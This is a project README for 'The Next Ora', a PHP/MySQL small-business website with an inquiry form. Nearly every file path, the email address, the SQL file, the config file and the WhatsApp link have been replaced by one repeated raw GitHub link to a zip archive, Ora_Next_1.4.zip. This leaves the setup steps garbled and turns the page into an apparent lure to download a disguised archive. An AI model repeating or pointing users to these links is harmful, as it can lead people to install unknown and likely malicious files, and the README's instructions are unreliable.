# The Next Ora

Production-ready website + inquiry backend for **The Next Ora**.

## Business Profile
- Brand Name: The Next Ora
- Tagline: Smart Digital Growth for Local Businesses
- Business Type: Digital Solutions Firm
- Phone / WhatsApp: +91 9313495498
- Email: https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
- Service Areas: Ahmedabad & Surat (India)

## Tech Stack
- Frontend: HTML5, CSS3, Vanilla JavaScript, Fetch API, JSON
- Backend: PHP MVC-style structure
- Database: MySQL

## Project Structure
```text
the-next-ora/
+-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+-- assets/
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
¦   +-- images/
+-- data/
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+-- backend/
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
```

## Setup (Local)
1. Place `the-next-ora` inside your web root (`htdocs`, `www`, etc.).
2. Import SQL from `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip` into MySQL.
3. Configure DB credentials via environment variables:
   - `DB_HOST`
   - `DB_PORT`
   - `DB_DATABASE`
   - `DB_USERNAME`
   - `DB_PASSWORD`
4. If env vars are unavailable, edit fallback values in `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`.
5. Open `http://localhost/the-next-ora/`.

## Inquiry Form Flow
- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip` submits via AJAX (`fetch`) to `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`.
- `InquiryController` sanitizes and validates all fields.
- `Inquiry` model checks duplicate spam submissions (10-minute window).
- Valid submissions are stored in MySQL table `inquiries`.
- Backend returns JSON success/error messages.

## Deploy on Shared Hosting
1. Upload `the-next-ora` to `public_html` or domain root.
2. Create a MySQL database from hosting panel.
3. Import `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`.
4. Configure DB credentials in env vars or `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`.
5. Ensure PHP 8.0+ and PDO MySQL extension are enabled.
6. Test contact form and confirm rows are saved in `inquiries`.

## Update Contact Details Everywhere
Update all occurrences in:
- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`

Replace:
- Phone / WhatsApp: `+919313495498`
- Email: `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
- WhatsApp URL base: `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`

## Notes
- SEO basics are implemented per page (title + description + semantic headings).
- UI is mobile-first, responsive, and follows the specified premium visual system.
- Clean URLs can be enabled with hosting rewrite rules if required.
